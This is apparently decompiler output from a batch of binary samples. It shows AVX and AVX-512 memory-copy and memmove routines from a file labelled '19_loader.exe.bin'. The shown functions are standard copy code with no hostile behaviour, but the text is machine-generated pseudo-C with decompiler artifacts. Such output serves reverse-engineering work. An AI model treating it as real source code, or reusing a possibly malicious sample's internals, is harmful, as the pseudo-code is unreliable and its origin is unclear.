  auVar40[0x21] = bVar3 * auVar37[0x21] | !bVar3 * in_register_00001221;
  bVar3 = (bool)((byte)(uVar32 >> 0x22) & 1);
  auVar40[0x22] = bVar3 * auVar37[0x22] | !bVar3 * in_register_00001222;
  bVar3 = (bool)((byte)(uVar32 >> 0x23) & 1);
  auVar40[0x23] = bVar3 * auVar37[0x23] | !bVar3 * in_register_00001223;
  bVar3 = (bool)((byte)(uVar32 >> 0x24) & 1);
  auVar40[0x24] = bVar3 * auVar37[0x24] | !bVar3 * in_register_00001224;
  bVar3 = (bool)((byte)(uVar32 >> 0x25) & 1);
  auVar40[0x25] = bVar3 * auVar37[0x25] | !bVar3 * in_register_00001225;
  bVar3 = (bool)((byte)(uVar32 >> 0x26) & 1);
  auVar40[0x26] = bVar3 * auVar37[0x26] | !bVar3 * in_register_00001226;
  bVar3 = (bool)((byte)(uVar32 >> 0x27) & 1);
  auVar40[0x27] = bVar3 * auVar37[0x27] | !bVar3 * in_register_00001227;
  bVar3 = (bool)((byte)(uVar32 >> 0x28) & 1);
  auVar40[0x28] = bVar3 * auVar37[0x28] | !bVar3 * in_register_00001228;
  bVar3 = (bool)((byte)(uVar32 >> 0x29) & 1);
  auVar40[0x29] = bVar3 * auVar37[0x29] | !bVar3 * in_register_00001229;
  bVar3 = (bool)((byte)(uVar32 >> 0x2a) & 1);
  auVar40[0x2a] = bVar3 * auVar37[0x2a] | !bVar3 * in_register_0000122a;
  bVar3 = (bool)((byte)(uVar32 >> 0x2b) & 1);
  auVar40[0x2b] = bVar3 * auVar37[0x2b] | !bVar3 * in_register_0000122b;
  bVar3 = (bool)((byte)(uVar32 >> 0x2c) & 1);
  auVar40[0x2c] = bVar3 * auVar37[0x2c] | !bVar3 * in_register_0000122c;
  bVar3 = (bool)((byte)(uVar32 >> 0x2d) & 1);
  auVar40[0x2d] = bVar3 * auVar37[0x2d] | !bVar3 * in_register_0000122d;
  bVar3 = (bool)((byte)(uVar32 >> 0x2e) & 1);
  auVar40[0x2e] = bVar3 * auVar37[0x2e] | !bVar3 * in_register_0000122e;
  bVar3 = (bool)((byte)(uVar32 >> 0x2f) & 1);
  auVar40[0x2f] = bVar3 * auVar37[0x2f] | !bVar3 * in_register_0000122f;
  bVar3 = (bool)((byte)(uVar32 >> 0x30) & 1);
  auVar40[0x30] = bVar3 * auVar37[0x30] | !bVar3 * in_register_00001230;
  bVar3 = (bool)((byte)(uVar32 >> 0x31) & 1);
  auVar40[0x31] = bVar3 * auVar37[0x31] | !bVar3 * in_register_00001231;
  bVar3 = (bool)((byte)(uVar32 >> 0x32) & 1);
  auVar40[0x32] = bVar3 * auVar37[0x32] | !bVar3 * in_register_00001232;
  bVar3 = (bool)((byte)(uVar32 >> 0x33) & 1);
  auVar40[0x33] = bVar3 * auVar37[0x33] | !bVar3 * in_register_00001233;
  bVar3 = (bool)((byte)(uVar32 >> 0x34) & 1);
  auVar40[0x34] = bVar3 * auVar37[0x34] | !bVar3 * in_register_00001234;
  bVar3 = (bool)((byte)(uVar32 >> 0x35) & 1);
  auVar40[0x35] = bVar3 * auVar37[0x35] | !bVar3 * in_register_00001235;
  bVar3 = (bool)((byte)(uVar32 >> 0x36) & 1);
  auVar40[0x36] = bVar3 * auVar37[0x36] | !bVar3 * in_register_00001236;
  bVar3 = (bool)((byte)(uVar32 >> 0x37) & 1);
  auVar40[0x37] = bVar3 * auVar37[0x37] | !bVar3 * in_register_00001237;
  bVar4 = (byte)(uVar32 >> 0x38);
  auVar40[0x38] = (bVar4 & 1) * auVar37[0x38] | !(bool)(bVar4 & 1) * in_register_00001238;
  bVar3 = (bool)(bVar4 >> 1 & 1);
  auVar40[0x39] = bVar3 * auVar37[0x39] | !bVar3 * in_register_00001239;
  bVar3 = (bool)(bVar4 >> 2 & 1);
  auVar40[0x3a] = bVar3 * auVar37[0x3a] | !bVar3 * in_register_0000123a;
  bVar3 = (bool)(bVar4 >> 3 & 1);
  auVar40[0x3b] = bVar3 * auVar37[0x3b] | !bVar3 * in_register_0000123b;
  bVar3 = (bool)(bVar4 >> 4 & 1);
  auVar40[0x3c] = bVar3 * auVar37[0x3c] | !bVar3 * in_register_0000123c;
  bVar3 = (bool)(bVar4 >> 5 & 1);
  auVar40[0x3d] = bVar3 * auVar37[0x3d] | !bVar3 * in_register_0000123d;
  bVar3 = (bool)(bVar4 >> 6 & 1);
  auVar40[0x3e] = bVar3 * auVar37[0x3e] | !bVar3 * in_register_0000123e;
  auVar40[0x3f] =
       -((char)bVar4 >> 7) * auVar37[0x3f] | !(bool)-((char)bVar4 >> 7) * in_register_0000123f;
  pauVar25 = (undefined1 (*) [64])((longlong)param_1 + lVar33);
  pauVar30 = (undefined1 (*) [64])((longlong)param_2 + lVar33);
  uVar32 = param_3 - lVar33;
  if (0x100 < uVar32) {
    if (0x180000 < uVar32) {
      do {
        uVar35 = uVar32;
        pauVar31 = pauVar30;
        pauVar26 = pauVar25;
        auVar37 = vmovdqu8_avx512bw(*pauVar31);
        auVar36 = auVar37._0_30_;
        auVar38 = vmovdqu8_avx512bw(pauVar31[1]);
        auVar41 = vmovdqu8_avx512bw(pauVar31[2]);
        auVar42 = vmovdqu8_avx512bw(pauVar31[3]);
        auVar37 = vmovntdq_avx512f(auVar37);
        *pauVar26 = auVar37;
        auVar37 = vmovntdq_avx512f(auVar38);
        pauVar26[1] = auVar37;
        auVar37 = vmovntdq_avx512f(auVar41);
        pauVar26[2] = auVar37;
        auVar37 = vmovntdq_avx512f(auVar42);
        pauVar26[3] = auVar37;
        uVar32 = uVar35 - 0x100;
        pauVar25 = pauVar26 + 4;
        pauVar30 = pauVar31 + 4;
      } while (0xff < uVar32);
      uVar34 = uVar35 - 0xe1 & 0xffffffffffffffe0;
      uVar32 = *(ulonglong *)(&DAT_140095448 + (0x20 - (uVar34 - uVar32)) * 8);
      switch(uVar35) {
      case 0x1e1:
      case 0x1e2:
      case 0x1e3:
      case 0x1e4:
      case 0x1e5:
      case 0x1e6:
      case 0x1e7:
      case 0x1e8:
      case 0x1e9:
      case 0x1ea:
      case 0x1eb:
      case 0x1ec:
      case 0x1ed:
      case 0x1ee:
      case 0x1ef:
      case 0x1f0:
      case 0x1f1:
      case 0x1f2:
      case 499:
      case 500:
      case 0x1f5:
      case 0x1f6:
      case 0x1f7:
      case 0x1f8:
      case 0x1f9:
      case 0x1fa:
      case 0x1fb:
      case 0x1fc:
      case 0x1fd:
      case 0x1fe:
      case 0x1ff:
        auVar42._0_32_ = vmovdqu8_avx512vl(*(undefined1 (*) [32])(*pauVar31 + uVar34));
        auVar2 = vmovntdq_avx(auVar42._0_32_);
        *(undefined1 (*) [32])(*pauVar26 + uVar34) = auVar2;
      case 0x1c1:
      case 0x1c2:
      case 0x1c3:
      case 0x1c4:
      case 0x1c5:
      case 0x1c6:
      case 0x1c7:
      case 0x1c8:
      case 0x1c9:
      case 0x1ca:
      case 0x1cb:
      case 0x1cc:
      case 0x1cd:
      case 0x1ce:
      case 0x1cf:
      case 0x1d0:
      case 0x1d1:
      case 0x1d2:
      case 0x1d3:
      case 0x1d4:
      case 0x1d5:
      case 0x1d6:
      case 0x1d7:
      case 0x1d8:
      case 0x1d9:
      case 0x1da:
      case 0x1db:
      case 0x1dc:
      case 0x1dd:
      case 0x1de:
      case 0x1df:
      case 0x1e0:
        auVar42._0_32_ = vmovdqu8_avx512vl(*(undefined1 (*) [32])(*pauVar31 + uVar34 + 0x20));
        auVar2 = vmovntdq_avx(auVar42._0_32_);
        *(undefined1 (*) [32])(*pauVar26 + uVar34 + 0x20) = auVar2;
      case 0x1a1:
      case 0x1a2:
      case 0x1a3:
      case 0x1a4:
      case 0x1a5:
      case 0x1a6:
      case 0x1a7:
      case 0x1a8:
      case 0x1a9:
      case 0x1aa:
      case 0x1ab:
      case 0x1ac:
      case 0x1ad:
      case 0x1ae:
      case 0x1af:
      case 0x1b0:
      case 0x1b1:
      case 0x1b2:
      case 0x1b3:
      case 0x1b4:
      case 0x1b5:
      case 0x1b6:
      case 0x1b7:
      case 0x1b8:
      case 0x1b9:
      case 0x1ba:
      case 0x1bb:
      case 0x1bc:
      case 0x1bd:
      case 0x1be:
      case 0x1bf:
      case 0x1c0:
        auVar42._0_32_ = vmovdqu8_avx512vl(*(undefined1 (*) [32])(pauVar31[1] + uVar34));
        auVar2 = vmovntdq_avx(auVar42._0_32_);
        *(undefined1 (*) [32])(pauVar26[1] + uVar34) = auVar2;
      case 0x181:
      case 0x182:
      case 0x183:
      case 0x184:
      case 0x185:
      case 0x186:
      case 0x187:
      case 0x188:
      case 0x189:
      case 0x18a:
      case 0x18b:
      case 0x18c:
      case 0x18d:
      case 0x18e:
      case 399:
      case 400:
      case 0x191:
      case 0x192:
      case 0x193:
      case 0x194:
      case 0x195:
      case 0x196:
      case 0x197:
      case 0x198:
      case 0x199:
      case 0x19a:
      case 0x19b:
      case 0x19c:
      case 0x19d:
      case 0x19e:
      case 0x19f:
      case 0x1a0:
        auVar42._0_32_ = vmovdqu8_avx512vl(*(undefined1 (*) [32])(pauVar31[1] + uVar34 + 0x20));
        auVar2 = vmovntdq_avx(auVar42._0_32_);
        *(undefined1 (*) [32])(pauVar26[1] + uVar34 + 0x20) = auVar2;
      case 0x161:
      case 0x162:
      case 0x163:
      case 0x164:
      case 0x165:
      case 0x166:
      case 0x167:
      case 0x168:
      case 0x169:
      case 0x16a:
      case 0x16b:
      case 0x16c:
      case 0x16d:
      case 0x16e:
      case 0x16f:
      case 0x170:
      case 0x171:
      case 0x172:
      case 0x173:
      case 0x174:
      case 0x175:
      case 0x176:
      case 0x177:
      case 0x178:
      case 0x179:
      case 0x17a:
      case 0x17b:
      case 0x17c:
      case 0x17d:
      case 0x17e:
      case 0x17f:
      case 0x180:
        auVar42._0_32_ = vmovdqu8_avx512vl(*(undefined1 (*) [32])(pauVar31[2] + uVar34));
        auVar2 = vmovntdq_avx(auVar42._0_32_);
        *(undefined1 (*) [32])(pauVar26[2] + uVar34) = auVar2;
      case 0x141:
      case 0x142:
      case 0x143:
      case 0x144:
      case 0x145:
      case 0x146:
      case 0x147:
      case 0x148:
      case 0x149:
      case 0x14a:
      case 0x14b:
      case 0x14c:
      case 0x14d:
      case 0x14e:
      case 0x14f:
      case 0x150:
      case 0x151:
      case 0x152:
      case 0x153:
      case 0x154:
      case 0x155:
      case 0x156:
      case 0x157:
      case 0x158:
      case 0x159:
      case 0x15a:
      case 0x15b:
      case 0x15c:
      case 0x15d:
      case 0x15e:
      case 0x15f:
      case 0x160:
        auVar42._0_32_ = vmovdqu8_avx512vl(*(undefined1 (*) [32])(pauVar31[2] + uVar34 + 0x20));
        auVar2 = vmovntdq_avx(auVar42._0_32_);
        *(undefined1 (*) [32])(pauVar26[2] + uVar34 + 0x20) = auVar2;
      case 0x121:
      case 0x122:
      case 0x123:
      case 0x124:
      case 0x125:
      case 0x126:
      case 0x127:
      case 0x128:
      case 0x129:
      case 0x12a:
      case 299:
      case 300:
      case 0x12d:
      case 0x12e:
      case 0x12f:
      case 0x130:
      case 0x131:
      case 0x132:
      case 0x133:
      case 0x134:
      case 0x135:
      case 0x136:
      case 0x137:
      case 0x138:
      case 0x139:
      case 0x13a:
      case 0x13b:
      case 0x13c:
      case 0x13d:
      case 0x13e:
      case 0x13f:
      case 0x140:
        auVar42._0_32_ = vmovdqu8_avx512vl(*(undefined1 (*) [32])(pauVar31[3] + uVar34));
        auVar36 = auVar42._0_30_;
        auVar2 = vmovntdq_avx(auVar42._0_32_);
        *(undefined1 (*) [32])(pauVar26[3] + uVar34) = auVar2;
      default:
        auVar37._32_32_ = auVar42._32_32_;
        auVar37._0_32_ = vmovdqu8_avx512vl(*(undefined1 (*) [32])(pauVar31[3] + uVar34 + 0x20));
        bVar3 = (bool)((byte)uVar32 & 1);
        auVar41[0] = bVar3 * auVar37[0] | !bVar3 * auVar36[0];
        bVar3 = (bool)((byte)(uVar32 >> 1) & 1);
        auVar41[1] = bVar3 * auVar37[1] | !bVar3 * auVar36[1];
        bVar3 = (bool)((byte)(uVar32 >> 2) & 1);
        auVar41[2] = bVar3 * auVar37[2] | !bVar3 * auVar36[2];
        bVar3 = (bool)((byte)(uVar32 >> 3) & 1);
        auVar41[3] = bVar3 * auVar37[3] | !bVar3 * auVar36[3];
        bVar3 = (bool)((byte)(uVar32 >> 4) & 1);
        auVar41[4] = bVar3 * auVar37[4] | !bVar3 * auVar36[4];
        bVar3 = (bool)((byte)(uVar32 >> 5) & 1);
        auVar41[5] = bVar3 * auVar37[5] | !bVar3 * auVar36[5];
        bVar3 = (bool)((byte)(uVar32 >> 6) & 1);
        auVar41[6] = bVar3 * auVar37[6] | !bVar3 * auVar36[6];
        bVar3 = (bool)((byte)(uVar32 >> 7) & 1);
        auVar41[7] = bVar3 * auVar37[7] | !bVar3 * auVar36[7];
        bVar3 = (bool)((byte)(uVar32 >> 8) & 1);
        auVar41[8] = bVar3 * auVar37[8] | !bVar3 * auVar36[8];
        bVar3 = (bool)((byte)(uVar32 >> 9) & 1);
        auVar41[9] = bVar3 * auVar37[9] | !bVar3 * auVar36[9];
        bVar3 = (bool)((byte)(uVar32 >> 10) & 1);
        auVar41[10] = bVar3 * auVar37[10] | !bVar3 * auVar36[10];
        bVar3 = (bool)((byte)(uVar32 >> 0xb) & 1);
        auVar41[0xb] = bVar3 * auVar37[0xb] | !bVar3 * auVar36[0xb];
        bVar3 = (bool)((byte)(uVar32 >> 0xc) & 1);
        auVar41[0xc] = bVar3 * auVar37[0xc] | !bVar3 * auVar36[0xc];
        bVar3 = (bool)((byte)(uVar32 >> 0xd) & 1);
        auVar41[0xd] = bVar3 * auVar37[0xd] | !bVar3 * auVar36[0xd];
        bVar3 = (bool)((byte)(uVar32 >> 0xe) & 1);
        auVar41[0xe] = bVar3 * auVar37[0xe] | !bVar3 * auVar36[0xe];
        bVar3 = (bool)((byte)(uVar32 >> 0xf) & 1);
        auVar41[0xf] = bVar3 * auVar37[0xf] | !bVar3 * auVar36[0xf];
        bVar3 = (bool)((byte)(uVar32 >> 0x10) & 1);
        auVar41[0x10] = bVar3 * auVar37[0x10] | !bVar3 * auVar36[0x10];
        bVar3 = (bool)((byte)(uVar32 >> 0x11) & 1);
        auVar41[0x11] = bVar3 * auVar37[0x11] | !bVar3 * auVar36[0x11];
        bVar3 = (bool)((byte)(uVar32 >> 0x12) & 1);
        auVar41[0x12] = bVar3 * auVar37[0x12] | !bVar3 * auVar36[0x12];
        bVar3 = (bool)((byte)(uVar32 >> 0x13) & 1);
        auVar41[0x13] = bVar3 * auVar37[0x13] | !bVar3 * auVar36[0x13];
        bVar3 = (bool)((byte)(uVar32 >> 0x14) & 1);
        auVar41[0x14] = bVar3 * auVar37[0x14] | !bVar3 * auVar36[0x14];
        bVar3 = (bool)((byte)(uVar32 >> 0x15) & 1);
        auVar41[0x15] = bVar3 * auVar37[0x15] | !bVar3 * auVar36[0x15];
        bVar3 = (bool)((byte)(uVar32 >> 0x16) & 1);
        auVar41[0x16] = bVar3 * auVar37[0x16] | !bVar3 * auVar36[0x16];
        bVar3 = (bool)((byte)(uVar32 >> 0x17) & 1);
        auVar41[0x17] = bVar3 * auVar37[0x17] | !bVar3 * auVar36[0x17];
        bVar3 = (bool)((byte)(uVar32 >> 0x18) & 1);
        auVar41[0x18] = bVar3 * auVar37[0x18] | !bVar3 * auVar36[0x18];
        bVar3 = (bool)((byte)(uVar32 >> 0x19) & 1);
        auVar41[0x19] = bVar3 * auVar37[0x19] | !bVar3 * auVar36[0x19];
        bVar3 = (bool)((byte)(uVar32 >> 0x1a) & 1);
        auVar41[0x1a] = bVar3 * auVar37[0x1a] | !bVar3 * auVar36[0x1a];
        bVar3 = (bool)((byte)(uVar32 >> 0x1b) & 1);
        auVar41[0x1b] = bVar3 * auVar37[0x1b] | !bVar3 * auVar36[0x1b];
        bVar3 = (bool)((byte)(uVar32 >> 0x1c) & 1);
        auVar41[0x1c] = bVar3 * auVar37[0x1c] | !bVar3 * auVar36[0x1c];
        bVar3 = (bool)((byte)(uVar32 >> 0x1d) & 1);
        auVar41._30_34_ = auVar37._30_34_;
        auVar41[0x1d] = bVar3 * auVar37[0x1d] | !bVar3 * auVar36[0x1d];
        auVar2 = vmovdqu8_avx512vl(auVar41._0_32_);
        *(undefined1 (*) [32])(pauVar26[3] + uVar34 + 0x20) = auVar2;
      case 0x100:
        auVar37 = vmovdqu8_avx512bw(auVar40);
        *param_1 = auVar37;
        return;
      }
    }
    do {
      auVar37 = vmovdqu8_avx512bw(*pauVar30);
      auVar38 = vmovdqu8_avx512bw(pauVar30[1]);
      auVar40 = vmovdqu8_avx512bw(pauVar30[2]);
      auVar41 = vmovdqu8_avx512bw(pauVar30[3]);
      auVar37 = vmovdqu8_avx512bw(auVar37);
      *pauVar25 = auVar37;
      auVar37 = vmovdqu8_avx512bw(auVar38);
      pauVar25[1] = auVar37;
      auVar37 = vmovdqu8_avx512bw(auVar40);
      pauVar25[2] = auVar37;
      auVar37 = vmovdqu8_avx512bw(auVar41);
      pauVar25[3] = auVar37;
      pauVar25 = pauVar25 + 4;
      pauVar30 = pauVar30 + 4;
      uVar32 = uVar32 - 0x100;
    } while (0xff < uVar32);
  }
                    /* WARNING: Could not recover jumptable at 0x00014001c0e8. Too many branches */
                    /* WARNING: Treating indirect jump as call */
  (*(code *)(IMAGE_DOS_HEADER_140000000.e_magic +
            *(uint *)(&DAT_140095400 + (uVar32 + 0x1f >> 5) * 4)))();
  return;
}



/* ===== SAMPLE 19_loader.exe.bin | RVA 0x1c2b0 | partial_markers_remain ===== */
/* address=14001c2b0 rva=0x1c2b0 */

void FUN_14001c2b0(undefined8 *param_1,undefined8 *param_2,ulonglong param_3)

{
  undefined8 *puVar1;
  undefined8 *puVar2;
  undefined1 auVar3 [32];
  undefined1 auVar4 [32];
  undefined1 auVar5 [32];
  undefined1 auVar6 [32];
  undefined1 uVar7;
  undefined2 uVar8;
  undefined4 uVar9;
  undefined8 uVar10;
  undefined8 uVar11;
  undefined8 uVar12;
  undefined8 uVar13;
  undefined8 uVar14;
  undefined8 uVar15;
  undefined8 uVar16;
  undefined8 uVar17;
  undefined8 uVar18;
  undefined8 uVar19;
  undefined8 uVar20;
  undefined8 uVar21;
  undefined8 uVar22;
  undefined1 (*pauVar23) [32];
  undefined1 (*pauVar24) [32];
  undefined8 *puVar25;
  undefined8 *puVar26;
  undefined1 (*pauVar27) [32];
  undefined1 (*pauVar28) [32];
  ulonglong uVar29;
  longlong lVar30;
  ulonglong uVar31;
  undefined8 uVar32;
  undefined8 uVar33;
  
  switch(param_3) {
  case 0:
    return;
  case 1:
    *(undefined1 *)param_1 = *(undefined1 *)param_2;
    return;
  case 2:
    *(undefined2 *)param_1 = *(undefined2 *)param_2;
    return;
  case 3:
    uVar7 = *(undefined1 *)((longlong)param_2 + 2);
    *(undefined2 *)param_1 = *(undefined2 *)param_2;
    *(undefined1 *)((longlong)param_1 + 2) = uVar7;
    return;
  case 4:
    *(undefined4 *)param_1 = *(undefined4 *)param_2;
    return;
  case 5:
    uVar7 = *(undefined1 *)((longlong)param_2 + 4);
    *(undefined4 *)param_1 = *(undefined4 *)param_2;
    *(undefined1 *)((longlong)param_1 + 4) = uVar7;
    return;
  case 6:
    uVar8 = *(undefined2 *)((longlong)param_2 + 4);
    *(undefined4 *)param_1 = *(undefined4 *)param_2;
    *(undefined2 *)((longlong)param_1 + 4) = uVar8;
    return;
  case 7:
    uVar8 = *(undefined2 *)((longlong)param_2 + 4);
    uVar7 = *(undefined1 *)((longlong)param_2 + 6);
    *(undefined4 *)param_1 = *(undefined4 *)param_2;
    *(undefined2 *)((longlong)param_1 + 4) = uVar8;
    *(undefined1 *)((longlong)param_1 + 6) = uVar7;
    return;
  case 8:
    *param_1 = *param_2;
    return;
  case 9:
    uVar7 = *(undefined1 *)(param_2 + 1);
    *param_1 = *param_2;
    *(undefined1 *)(param_1 + 1) = uVar7;
    return;
  case 10:
    uVar8 = *(undefined2 *)(param_2 + 1);
    *param_1 = *param_2;
    *(undefined2 *)(param_1 + 1) = uVar8;
    return;
  case 0xb:
    uVar8 = *(undefined2 *)(param_2 + 1);
    uVar7 = *(undefined1 *)((longlong)param_2 + 10);
    *param_1 = *param_2;
    *(undefined2 *)(param_1 + 1) = uVar8;
    *(undefined1 *)((longlong)param_1 + 10) = uVar7;
    return;
  case 0xc:
    uVar9 = *(undefined4 *)(param_2 + 1);
    *param_1 = *param_2;
    *(undefined4 *)(param_1 + 1) = uVar9;
    return;
  case 0xd:
    uVar9 = *(undefined4 *)(param_2 + 1);
    uVar7 = *(undefined1 *)((longlong)param_2 + 0xc);
    *param_1 = *param_2;
    *(undefined4 *)(param_1 + 1) = uVar9;
    *(undefined1 *)((longlong)param_1 + 0xc) = uVar7;
    return;
  case 0xe:
    uVar9 = *(undefined4 *)(param_2 + 1);
    uVar8 = *(undefined2 *)((longlong)param_2 + 0xc);
    *param_1 = *param_2;
    *(undefined4 *)(param_1 + 1) = uVar9;
    *(undefined2 *)((longlong)param_1 + 0xc) = uVar8;
    return;
  case 0xf:
    uVar9 = *(undefined4 *)(param_2 + 1);
    uVar8 = *(undefined2 *)((longlong)param_2 + 0xc);
    uVar7 = *(undefined1 *)((longlong)param_2 + 0xe);
    *param_1 = *param_2;
    *(undefined4 *)(param_1 + 1) = uVar9;
    *(undefined2 *)((longlong)param_1 + 0xc) = uVar8;
    *(undefined1 *)((longlong)param_1 + 0xe) = uVar7;
    return;
  }
  if (param_3 < 0x21) {
    uVar10 = param_2[1];
    puVar26 = (undefined8 *)((longlong)param_2 + (param_3 - 0x10));
    uVar11 = *puVar26;
    uVar12 = puVar26[1];
    *param_1 = *param_2;
    param_1[1] = uVar10;
    puVar26 = (undefined8 *)((longlong)param_1 + (param_3 - 0x10));
    *puVar26 = uVar11;
    puVar26[1] = uVar12;
    return;
  }
  puVar26 = (undefined8 *)((longlong)param_2 + param_3);
  if (param_1 <= param_2) {
    puVar26 = param_1;
  }
  if (param_1 < puVar26) {
    uVar10 = *param_2;
    uVar11 = param_2[1];
    lVar30 = (longlong)param_2 - (longlong)param_1;
    puVar26 = (undefined8 *)((longlong)param_1 + lVar30 + (param_3 - 0x10));
    uVar12 = *puVar26;
    uVar13 = puVar26[1];
    puVar25 = (undefined8 *)((longlong)param_1 + (param_3 - 0x10));
    uVar29 = param_3 - 0x10;
    puVar26 = puVar25;
    uVar32 = uVar12;
    uVar33 = uVar13;
    if (((ulonglong)puVar25 & 0xf) != 0) {
      puVar26 = (undefined8 *)((ulonglong)puVar25 & 0xfffffffffffffff0);
      uVar32 = *(undefined8 *)((longlong)puVar26 + lVar30);
      uVar33 = ((undefined8 *)((longlong)puVar26 + lVar30))[1];
      *puVar25 = uVar12;
      *(undefined8 *)((longlong)param_1 + (param_3 - 8)) = uVar13;
      uVar29 = (longlong)puVar26 - (longlong)param_1;
    }
    uVar31 = uVar29 >> 7;
    if (uVar31 != 0) {
      *puVar26 = uVar32;
      puVar26[1] = uVar33;
      puVar25 = puVar26;
      while( true ) {
        puVar1 = (undefined8 *)((longlong)puVar25 + lVar30 + -0x10);
        uVar12 = puVar1[1];
        puVar26 = (undefined8 *)((longlong)puVar25 + lVar30 + -0x20);
        uVar13 = *puVar26;
        uVar32 = puVar26[1];
        puVar26 = puVar25 + -0x10;
        puVar25[-2] = *puVar1;
        puVar25[-1] = uVar12;
        puVar25[-4] = uVar13;
        puVar25[-3] = uVar32;
        puVar1 = (undefined8 *)((longlong)puVar25 + lVar30 + -0x30);
        uVar12 = puVar1[1];
        puVar2 = (undefined8 *)((longlong)puVar25 + lVar30 + -0x40);
        uVar13 = *puVar2;
        uVar32 = puVar2[1];
        uVar31 = uVar31 - 1;
        puVar25[-6] = *puVar1;
        puVar25[-5] = uVar12;
        puVar25[-8] = uVar13;
        puVar25[-7] = uVar32;
        puVar1 = (undefined8 *)((longlong)puVar25 + lVar30 + -0x50);
        uVar12 = puVar1[1];
        puVar2 = (undefined8 *)((longlong)puVar25 + lVar30 + -0x60);
        uVar13 = *puVar2;
        uVar32 = puVar2[1];
        puVar25[-10] = *puVar1;
        puVar25[-9] = uVar12;
        puVar25[-0xc] = uVar13;
        puVar25[-0xb] = uVar32;
        puVar1 = (undefined8 *)((longlong)puVar25 + lVar30 + -0x70);
        uVar12 = *puVar1;
        uVar13 = puVar1[1];
        uVar32 = *(undefined8 *)((longlong)puVar26 + lVar30);
        uVar33 = ((undefined8 *)((longlong)puVar26 + lVar30))[1];
        if (uVar31 == 0) break;
        puVar25[-0xe] = uVar12;
        puVar25[-0xd] = uVar13;
        *puVar26 = uVar32;
        puVar25[-0xf] = uVar33;
        puVar25 = puVar26;
      }
      puVar25[-0xe] = uVar12;
      puVar25[-0xd] = uVar13;
      uVar29 = uVar29 & 0x7f;
    }
    for (uVar31 = uVar29 >> 4; uVar31 != 0; uVar31 = uVar31 - 1) {
      *puVar26 = uVar32;
      puVar26[1] = uVar33;
      puVar26 = puVar26 + -2;
      uVar32 = *(undefined8 *)((longlong)puVar26 + lVar30);
      uVar33 = ((undefined8 *)((longlong)puVar26 + lVar30))[1];
    }
    if ((uVar29 & 0xf) != 0) {
      *param_1 = uVar10;
      param_1[1] = uVar11;
    }
    *puVar26 = uVar32;
    puVar26[1] = uVar33;
    return;
  }
  if ((param_3 < 0x180000) && (0x1fff < param_3)) {
    for (; param_3 != 0; param_3 = param_3 - 1) {
      *(undefined1 *)param_1 = *(undefined1 *)param_2;
      param_2 = (undefined8 *)((longlong)param_2 + 1);
      param_1 = (undefined8 *)((longlong)param_1 + 1);
    }
    return;
  }
  uVar10 = *param_2;
  uVar11 = param_2[1];
  uVar12 = param_2[2];
  uVar13 = param_2[3];
  puVar26 = (undefined8 *)((longlong)param_2 + (param_3 - 0x20));
  uVar32 = *puVar26;
  uVar33 = puVar26[1];
  uVar14 = puVar26[2];
  uVar15 = puVar26[3];
  if (0x100 < param_3) {
    lVar30 = ((ulonglong)param_1 & 0x1f) - 0x20;
    pauVar23 = (undefined1 (*) [32])((longlong)param_1 - lVar30);
    pauVar27 = (undefined1 (*) [32])((longlong)param_2 - lVar30);
    param_3 = param_3 + lVar30;
    if (0x100 < param_3) {
      if (0x180000 < param_3) {
        do {
          uVar29 = param_3;
          pauVar28 = pauVar27;
          pauVar24 = pauVar23;
          auVar3 = pauVar28[1];
          auVar4 = pauVar28[2];
          auVar5 = pauVar28[3];
          auVar6 = vmovntdq_avx(*pauVar28);
          *pauVar24 = auVar6;
          auVar3 = vmovntdq_avx(auVar3);
          pauVar24[1] = auVar3;
          auVar3 = vmovntdq_avx(auVar4);
          pauVar24[2] = auVar3;
          auVar3 = vmovntdq_avx(auVar5);
          pauVar24[3] = auVar3;
          auVar3 = pauVar28[5];
          auVar4 = pauVar28[6];
          auVar5 = pauVar28[7];
          auVar6 = vmovntdq_avx(pauVar28[4]);
          pauVar24[4] = auVar6;
          auVar3 = vmovntdq_avx(auVar3);
          pauVar24[5] = auVar3;
          auVar3 = vmovntdq_avx(auVar4);
          pauVar24[6] = auVar3;
          auVar3 = vmovntdq_avx(auVar5);
          pauVar24[7] = auVar3;
          pauVar23 = pauVar24 + 8;
          pauVar27 = pauVar28 + 8;
          param_3 = uVar29 - 0x100;
        } while (0xff < uVar29 - 0x100);
        uVar31 = uVar29 - 0xe1 & 0xffffffffffffffe0;
        switch(uVar29) {
        case 0x1e1:
        case 0x1e2:
        case 0x1e3:
        case 0x1e4:
        case 0x1e5:
        case 0x1e6:
        case 0x1e7:
        case 0x1e8:
        case 0x1e9:
        case 0x1ea:
        case 0x1eb:
        case 0x1ec:
        case 0x1ed:
        case 0x1ee:
        case 0x1ef:
        case 0x1f0:
        case 0x1f1:
        case 0x1f2:
        case 499:
        case 500:
        case 0x1f5:
        case 0x1f6:
        case 0x1f7:
        case 0x1f8:
        case 0x1f9:
        case 0x1fa:
        case 0x1fb:
        case 0x1fc:
        case 0x1fd:
        case 0x1fe:
        case 0x1ff:
          auVar3 = vmovntdq_avx(*(undefined1 (*) [32])(*pauVar28 + uVar31));
          *(undefined1 (*) [32])(*pauVar24 + uVar31) = auVar3;
        case 0x1c1:
        case 0x1c2:
        case 0x1c3:
        case 0x1c4:
        case 0x1c5:
        case 0x1c6:
        case 0x1c7:
        case 0x1c8:
        case 0x1c9:
        case 0x1ca:
        case 0x1cb:
        case 0x1cc:
        case 0x1cd:
        case 0x1ce:
        case 0x1cf:
        case 0x1d0:
        case 0x1d1:
        case 0x1d2:
        case 0x1d3:
        case 0x1d4:
        case 0x1d5:
        case 0x1d6:
        case 0x1d7:
        case 0x1d8:
        case 0x1d9:
        case 0x1da:
        case 0x1db:
        case 0x1dc:
        case 0x1dd:
        case 0x1de:
        case 0x1df:
        case 0x1e0:
          auVar3 = vmovntdq_avx(*(undefined1 (*) [32])(pauVar28[1] + uVar31));
          *(undefined1 (*) [32])(pauVar24[1] + uVar31) = auVar3;
        case 0x1a1:
        case 0x1a2:
        case 0x1a3:
        case 0x1a4:
        case 0x1a5:
        case 0x1a6:
        case 0x1a7:
        case 0x1a8:
        case 0x1a9:
        case 0x1aa:
        case 0x1ab:
        case 0x1ac:
        case 0x1ad:
        case 0x1ae:
        case 0x1af:
        case 0x1b0:
        case 0x1b1:
        case 0x1b2:
        case 0x1b3:
        case 0x1b4:
        case 0x1b5:
        case 0x1b6:
        case 0x1b7:
        case 0x1b8:
        case 0x1b9:
        case 0x1ba:
        case 0x1bb:
        case 0x1bc:
        case 0x1bd:
        case 0x1be:
        case 0x1bf:
        case 0x1c0:
          auVar3 = vmovntdq_avx(*(undefined1 (*) [32])(pauVar28[2] + uVar31));
